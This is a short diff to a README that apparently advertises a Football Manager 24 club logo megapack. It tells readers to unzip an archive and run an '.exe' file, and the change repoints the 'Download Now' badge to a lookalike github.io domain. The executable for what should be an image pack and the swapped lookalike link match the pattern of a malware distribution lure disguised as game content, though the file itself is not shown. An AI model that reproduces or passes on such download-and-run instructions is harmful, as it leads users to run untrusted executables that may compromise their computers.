@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fm24-club-logos-megapack.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fm24club-logosmegapack.github.io/.github/)
 
 ## 📸 Overview
 ![fm24-megapack-authentic-logos](https://github.com/user-attachments/assets/6baafb86-bc28-4b4d-a978-c38a4d050341)
